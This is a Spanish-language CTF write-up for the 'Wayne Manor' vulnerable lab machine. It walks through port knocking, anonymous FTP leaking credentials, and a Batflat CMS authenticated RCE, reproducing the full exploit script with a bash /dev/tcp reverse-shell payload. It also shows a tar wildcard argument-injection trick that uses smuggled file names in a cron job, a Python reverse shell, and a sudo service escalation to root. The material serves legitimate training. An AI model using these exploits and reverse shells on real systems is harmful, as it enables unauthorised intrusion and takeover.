# Wayne Manor _Writeup_
### Máquina B2R creada para el CTF de MoonFHunters.

Esta máquina fue creada por el usuario @sec_balkan.

Contenido:
- Port Knocking.
- RCE (Remote Code Execution).
- Cronjobs.
- Sudoers.


### Sobre la máquina:

- Testeada en VMWare.
- DHCP activado.
- Añadir al archivo _/etc/hosts_:
```sh
<ip> waynemanor.com
```


### _Walktrought_:

Una vez tengamos acceso a la máquina y sepamos su dirección IP, escanearemos todos los servicios que tenga disponibles.

```sh
┌──(root💀kali)-[/home/kali]
└─# nmap -sT -p- --open -T5 --min-rate 10000 -n 192.168.51.131 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:49 EDT
Nmap scan report for 192.168.51.131
Host is up (0.0012s latency).
Not shown: 65533 closed ports

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:51:07:3F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.01 seconds
```
```sh
┌──(root💀kali)-[/home/kali]
└─# nmap -sC -sV -p22,80 192.168.51.131 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:50 EDT
Nmap scan report for waynemanor.com (192.168.51.131)
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e4:b9:54:24:6c:42:0b:64:30:a4:5f:57:ed:d3:a3:91 (RSA)
|   256 d5:79:0c:fa:91:fb:8d:f2:e7:86:62:c2:c7:88:8c:43 (ECDSA)
|_  256 29:0f:34:05:ed:24:1a:f3:79:e2:97:99:cb:bc:a8:0a (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Batflat
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Wayne Manor Blog - Wayne Manor
MAC Address: 00:0C:29:51:07:3F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
```

En base a los resultados obtenidos, accederemos a su página web, en la que podremos ver un _CMS_, como nos indica _nmap_ e inspeccionando _Wayne Manor Blog - Wayne Manor_, el _CMS_ se llama _Batflat_, y en dentro de éste, hay una publicación.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/web.PNG)

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/publicacion.PNG)

> Knock the door in front of the mansion.
> Written by Bruce Wayne on September 19, 1939

> Alfred is warned to only let in about 300, 350, 400 people, but sometimes, if all those people come in, a secret room is opened, so people can Finish The Party.

Haciendo un poco de _guessing_ deducimos que hay que hacer _port knocking_ a los puertos _300, 350 y 400_ para abrir el servicio _FTP_.

Primero, comprobaremos si está disponible el servicio _FTP_, después con _telnet_ enviaremos peticiones a los _3_ puertos, y después comprobaremos si el puerto _21_ se abre.

```sh
nc -nv 192.168.51.131 21 || telnet 192.168.51.131 300 || telnet 192.168.51.131 350 || telnet 192.168.51.131 400 || nmap -sC -sV -p21 192.168.51.131
```

```sh
┌──(root💀kali)-[/home/kali]
└─#  <copypaste del comando anterior>

192.168.51.131 400 || nmap -sC -sV -p21 192.168.51.131
(UNKNOWN) [192.168.51.131] 21 (ftp) : Connection refused

Trying 192.168.51.131...
telnet: Unable to connect to remote host: Connection refused

Trying 192.168.51.131...
telnet: Unable to connect to remote host: Connection refused

Trying 192.168.51.131...
telnet: Unable to connect to remote host: Connection refused

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:57 EDT
Nmap scan report for waynemanor.com (192.168.51.131)
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             263 Mar 26 23:03 info.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.51.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 00:0C:29:51:07:3F (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
```

Una vez abierto, entramos gracias a el login anónimo, y en un archivo _.txt_ encontraremos un texto con unas credecianles.

```sh
┌──(root💀kali)-[/home/kali]
└─# ftp 192.168.51.131
Connected to 192.168.51.131.
220 (vsFTPd 3.0.3)
Name (192.168.51.131:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             263 Mar 26 23:03 info.txt
226 Directory send OK.
ftp> get info.txt
local: info.txt remote: info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for info.txt (263 bytes).
226 Transfer complete.
263 bytes received in 0.10 secs (2.5864 kB/s)
ftp> exit
221 Goodbye.
```

Contenido de _info.txt_:

>Hi Bruce!
>Here are the credentials for the website (you are a bit forgetful).
>I hope you didn't find 'Port Knocking' too difficult.
>By the way, you are meeting Dick at 19:00 for coffee before the party at home.
>USER: bruce
>PASS: alfred_help_me (Hahahahahaha)

Una vez con unas credenciales, intentaremos autenticarnos contra nuestro _CMS_ alojado en el servicio _HTTP_.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/batflat1.PNG)

Como podemos comprobar, las credenciales son válidas, ahora, buscaremos posibles exploits para nuestro _CMS_.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/batflat%202.PNG)

Con una simple búsqueda con la herramienta _searchsploit_, encontramos un posible exploit en la página de [exploitdb] (Batflat CMS 1.3.6 - Authenticated Remote Code Execution), finalmente con _searchsploit -m <exploit>_ nos traemos el fichero al directorio actual.

[exploitdb]: https://www.exploit-db.com/exploits/49573

```sh
┌──(root💀kali)-[/home/kali]
└─# searchsploit batflat 
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
Batflat CMS 1.3.6 - 'multiple' Stored XSS          | php/webapps/49583.txt
Batflat CMS 1.3.6 - Remote Code Execution (Authent | php/webapps/49573.py
--------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```py
# Exploit Title: Batflat CMS 1.3.6 - Remote Code Execution (Authenticated)
# Date: 2020-12-27
# Exploit Author: mari0x00
# Vendor Homepage: https://batflat.org/
# Software Link: https://github.com/sruupl/batflat/archive/master.zip
# Description: https://secator.pl/index.php/2021/02/15/batflat-v-1-3-6-authenticated-remote-code-execution-public-disclosure/
# Version: <= 1.3.6
# CVE: CVE-2020-35734

#!/usr/bin/python3

import requests
import sys
import re
from bs4 import BeautifulSoup
from termcolor import colored
from time import sleep

print(colored('''###########################################################''',"red"))
print(colored('''#######    Batflat authenticated RCE by mari0x00    #######''',"red"))
print(colored('''###########################################################''',"red"))
print("")

if len(sys.argv) != 6:
    print((colored("[~] Usage : python3 batpwnd.py <url> <username> <password> <IP> <PORT>","red")))
    print((colored("[~] Default credentials: admin/admin","red")))
    print((colored("[~] Example: python3 batpwnd.py http://192.168.101.105/ admin admin 192.168.101.101 4444","red")))
    exit()
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
IP = sys.argv[4]
PORT = sys.argv[5]


#Start session
s = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}


#Authenticate
print((colored("[+] Attempting user login","blue")))

login_data = {
    "username": username,
    "password": password,
    "login": "",
   }

login = s.post(url+"admin/", login_data, headers=headers)
sleep(0.5)

#Get token
print((colored("[+] Retrieving the token","blue")))
r = s.get(url+"admin/", headers=headers).content
soup = BeautifulSoup(r, "lxml")
token = (re.search(r't=(.*?)">Add', str(soup)).group(1))
print((colored("[+] Token ID: " + token,"blue")))
sleep(0.5)

#Get URL
print((colored("[+] Getting the add-user endpoint URL","blue")))
r = s.get(url+"admin/users/add?t="+token, headers=headers).content
soup = BeautifulSoup(r, "lxml")
add_user_url = (re.search(r'action="(.*?)"', str(soup)).group(1))
sleep(0.5)

#Exploit
print((colored("[+] Adding pwnd user","blue")))
payload = "<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/" + IP + "/" + PORT + " 0>&1'\");?>"

add_user = {
    "username": (None, "pwnd"),
    "fullname": (None, payload),
    "description": (None, "pwnd"),
    "email": (None, "pwnd@evil.com"),
    "password": (None, "pwnd123"),
    "access[]": (None, "users"),
    "save": (None, "Save")
}

exploit = s.post(add_user_url, headers=headers, files=add_user)
sleep(0.5)

#Triggering reverse shell
print("")
print((colored("[+] Triggering the shell. Go nuts!","green")))
r = s.get(url+"admin/users/manage?t="+token, headers=headers)
```

Lo lanzamos como nos indica el exploit _(python3 batpwnd.py <url> <username> <password> <IP>)_ (mientras estamos escuchando en un puerto en específico, en este caso el 80) y obtenemos una shell como el usuario _www-data_.

```sh
┌──(kali㉿kali)-[/tmp]
└─$ python3 49573.py http://waynemanor.com/ bruce alfred_help_me 192.168.51.129 80
###########################################################
#######    Batflat authenticated RCE by mari0x00    #######
###########################################################

[+] Attempting user login
[+] Retrieving the token
[+] Token ID: f9567c6b53d8
[+] Getting the add-user endpoint URL
[+] Adding pwnd user

[+] Triggering the shell. Go nuts!
```

```sh
┌──(kali㉿kali)-[~]
└─$ sudo rlwrap nc -nlvp 80 
listening on [any] 80 ...
connect to [192.168.51.129] from (UNKNOWN) [192.168.51.131] 46802
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
www-data@waynemanor:~/html/batflat/admin$
```

Ahora con una shell como el usuario _www-data_ inciaremos la escalada de privilegios.

A continuación nos descargaremos el binario de _pspy_ (una herramienta para la monitorización de procesos) y lo pondremos en escucha en el equipo para ver en tiempo real qué procesos se están ejecutando.

```sh
www-data@waynemanor:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
--2021-04-14 18:06:53--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210414%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210414T180654Z&X-Amz-Expires=300&X-Amz-Signature=999d7a8ebbb1cebb39f489cc831deefece89ad81c1f4c3711913aff26f582222&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [following]
--2021-04-14 18:06:54--  https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210414%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210414T180654Z&X-Amz-Expires=300&X-Amz-Signature=999d7a8ebbb1cebb39f489cc831deefece89ad81c1f4c3711913aff26f582222&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream
Resolving github-releases.githubusercontent.com (github-releases.githubusercontent.com)... 185.199.111.154, 185.199.108.154, 185.199.110.154, ...
Connecting to github-releases.githubusercontent.com (github-releases.githubusercontent.com)|185.199.111.154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                          100%[====================================================================================================>]   2.94M  10.2MB/s    in 0.3s

2021-04-14 18:06:54 (10.2 MB/s) - ‘pspy64’ saved [3078592/3078592]

www-data@waynemanor:/tmp$ chmod +x pspy64
```

Ejecutamos el binario y nos irán apareciendo distintos procesos de distintos usuarios.

```sh
www-data@waynemanor:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/04/14 18:08:32 CMD: UID=0    PID=99     |
2021/04/14 18:08:32 CMD: UID=33   PID=983    | php-fpm: pool www
2021/04/14 18:08:32 CMD: UID=33   PID=982    | php-fpm: pool www
```

Esperaremos más o menos un minuto (lo que tarda en ejecutarse el cron), y veremos que se ejecuta un script de forma automática.

```
2021/04/14 18:09:01 CMD: UID=1000 PID=1938   |
2021/04/14 18:09:01 CMD: UID=1000 PID=1939   | /bin/bash /home/batman/.web/script.sh
2021/04/14 18:09:01 CMD: UID=1000 PID=1940   | tar -zcf /tmp/web.tar.gz batflat index.nginx-debian.html robots.txt
2021/04/14 18:09:01 CMD: UID=1000 PID=1941   | tar -zcf /tmp/web.tar.gz batflat index.nginx-debian.html robots.txt
```

Esto significa que el usuario con UID 1000 (batman), ejecuta ese binario cada un minuto, así que vamos a ver qué binario ejecuta y qué es lo que está haciendo realmente.

```sh
www-data@waynemanor:~$ cat /home/batman/.web/script.sh
#!/bin/bash

cd /var/www/html && tar -zcf /tmp/web.tar.gz *

#TO DO: Improve the script.
```

Como vemos, con la herramienta _tar_ hace un backup de toda la página web (*), así que, al usar el asterisco para refererirse a todos los archivos, podremos abusar de esa mala configuración de el _wildcard_ (más información [aquí](https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e) y [aquí](https://gtfobins.github.io/gtfobins/tar/#sudo)).

Resumiendo, lo que vamos a hacer es añadirle dos argumentos a el script del cron, para que ejecute un binario que nosotros le indiquemos.

Este es el script original:

```sh
tar -zcf /tmp/web.tar.gz *
```

Y gracias al _wildcard_ (*) le añadiremos dos argumentos que nos ejecutaran un binario malicioso:

```sh
tar -zcf /tmp/web.tar.gz --checkpoint=1 --checkpoint-action=exec=python3 privesc.py
```

¿Cómo? Creando dos archivos en el directorio _/var/www/html_.

Lo primero que haremos será crear una reverse shell en _python_.

Contenido de _privesc.py_ en el directorio _/var/www/html_:

```py
import socket
import os
import subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<ip>",<puerto>));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

Creamos los archivos en el directorio _/var/www/html_:

```
echo "" > "--checkpoint-action=exec=python3 privesc.py"
echo "" > --checkpoint=1
```

Ahora solo habrá que esperar a que el cron se ejecute, y en cuanto lo haga (+- 1'), obtendremos una shell en bash en nuestro equipo en escucha _(nc -nlvp <puerto>)_.

```sh
┌──(kali㉿kali)-[~]
└─$ sudo rlwrap nc -nlvp 22
listening on [any] 22 ...
connect to [192.168.51.129] from (UNKNOWN) [192.168.51.131] 40158
bash: cannot set terminal process group (63085): Inappropriate ioctl for device
bash: no job control in this shell
batman@waynemanor:/var/www/html$
```

Una vez somos el usuario batman, podremos ver la flag alojada en el directorio _/home/batman/local.txt_.

```
bash-5.0$ cat /home/batman/local.txt

I left the party... I saw the call... I had to go... Gotham City needs me...


 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::::::::-'    `-::::::::::::::::::
 ::::::::::::::::::::::::::::::::::::::::::-'          `::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::-  '   /(_M_)\  `:::::::::::::::
 :::::::::::::::::::::::::::::::::::-'        |       |  :::::::::::::::
 ::::::::::::::::::::::::::::::::-         .   \/~V~\/  ,:::::::::::::::
 ::::::::::::::::::::::::::::-'             .          ,::::::::::::::::
 :::::::::::::::::::::::::-'                 `-.    .-::::::::::::::::::
 :::::::::::::::::::::-'                  _,,-::::::::::::::::::::::::::
 ::::::::::::::::::-'                _,--:::::::::::::::::::::::::::::::
 ::::::::::::::-'               _.--::::::::::::::::::::::#####:::::::::
 :::::::::::-'             _.--:::::::::::::::::::::::::::#####:::::####
 ::::::::'    ##     ###.-::::::###:::::::::::::::::::::::#####:::::####
 ::::-'       ###_.::######:::::###::::::::::::::#####:##########:::####
 :'         .:###::########:::::###::::::::::::::#####:##########:::####
      ...--:::###::########:::::###:::::######:::#####:##########:::####
  _.--:::##:::###:#########:::::###:::::######:::#####:#################
 '#########:::###:#########::#########::######:::#####:#################
 :#########:::#############::#########::######:::#######################
 ##########:::########################::################################
 ##########:::##########################################################
 ##########:::##########################################################
 #######################################################################
 #######################################################################
 #################################################################### ##
 #######################################################################

                   e*******************************
```

Para escalar a root, ejecutaremos el comando _sudo -l_ para ver los binarios que podemos ejecutar como otros usuarios.

```sh
batman@waynemanor:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for batman on waynemanor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User batman may run the following commands on waynemanor:
    (root) NOPASSWD: /usr/sbin/service
batman@waynemanor:/var/www/html$
```

Finalmente, el archivo _/etc/sudoers_ nos indica que podemos ejecutar _/usr/sbin/service_ como el usuario root (más información [aquí](https://gtfobins.github.io/gtfobins/service/#sudo).

Abusaremos de esta configuracion con el comando:

```sh
sudo service ../../bin/bash
```

```sh
batman@waynemanor:/$ sudo service ../../bin/bash
sudo service ../../bin/bash
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
groups
root
```

Ahora ya podremos leer la flag de root (proof.txt) alojada en _/root/proof.txt_.

```
cat /root/proof.txt

Rescue a cat? Unbelievable, I had to leave that journalist who works at 'The Gotham Times' for this animal...

Well... I'll have to get back to the party, Alfred needs me.


                 T\ T\
                 | \| \
                 |  |  :
            _____I__I  |
          .'            '.
        .'                '
        |   ..             '
        |  /__.            |
        :.' -'             |
       /__.                |
      /__, \               |
         |__\        _|    |
         :  '\     .'|     |
         |___|_,,,/  |     |    _..--.
      ,--_-   |     /'      \../ /  /\\
     ,'|_ I---|    7    ,,,_/ / ,  / _\\
   ,-- 7 \|  / ___..,,/   /  ,  ,_/   '-----.
  /   ,   \  |/  ,____,,,__,,__/            '\
 ,   ,     \__,,/                             |
 | '.       _..---.._                         !.
 ! |      .'  _ __ . '.                        |
 .:'      | (-_ _--')  :          L            !
 .'.       '.  Y    _.'             \,         :
  .          '-----'                 !          .
  .           /  \                   .          .



    34d1f91fb2e514b8576fab1a75a89a6b
    3*******************************


***************************************************************************************************************************

Congratulations for compromising my first vulnerable machine!

You can follow me on Twitter (@sec_balkan), in GitHub (@sec-balkan) or send me a message on Telegram (@sec_balkan).

Thank you!
```
